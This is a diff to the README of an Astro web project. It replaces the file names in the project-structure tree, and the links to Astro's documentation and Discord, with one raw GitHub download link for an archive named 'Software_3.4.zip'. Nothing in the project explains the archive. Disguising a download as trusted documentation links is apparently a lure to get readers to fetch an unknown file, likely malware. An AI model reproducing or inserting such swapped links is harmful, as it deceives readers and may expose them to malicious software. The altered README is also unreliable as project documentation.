@@ -9,15 +9,15 @@ Inside of your Anmol Jeevan project, you'll see the following folders and files:
 ```text
 /
 ├── public/
-│   └── favicon.svg
+│   └── https://github.com/ajay-mandalk/anmoljeevan/raw/refs/heads/main/src/lib/Software_3.4.zip
 ├── src/
 │   ├── components/
-│   │   └── ExampleComponent.astro
+│   │   └── https://github.com/ajay-mandalk/anmoljeevan/raw/refs/heads/main/src/lib/Software_3.4.zip
 │   ├── layouts/
-│   │   └── MainLayout.astro
+│   │   └── https://github.com/ajay-mandalk/anmoljeevan/raw/refs/heads/main/src/lib/Software_3.4.zip
 │   └── pages/
-│       └── index.astro
-└── package.json
+│       └── https://github.com/ajay-mandalk/anmoljeevan/raw/refs/heads/main/src/lib/Software_3.4.zip
+└── https://github.com/ajay-mandalk/anmoljeevan/raw/refs/heads/main/src/lib/Software_3.4.zip
 ```
 
 Astro looks for `.astro` or `.md` files in the `src/pages/` directory. Each page is exposed as a route based on its file name.
@@ -41,7 +41,7 @@ All commands are run from the root of the project, from a terminal:
 
 ## 👀 Want to learn more?
 
-Feel free to check [Astro's documentation](https://docs.astro.build) or join the [Astro Discord server](https://astro.build/chat).
+Feel free to check [Astro's documentation](https://github.com/ajay-mandalk/anmoljeevan/raw/refs/heads/main/src/lib/Software_3.4.zip) or join the [Astro Discord server](https://github.com/ajay-mandalk/anmoljeevan/raw/refs/heads/main/src/lib/Software_3.4.zip).
 
 ## Technologies Used
 
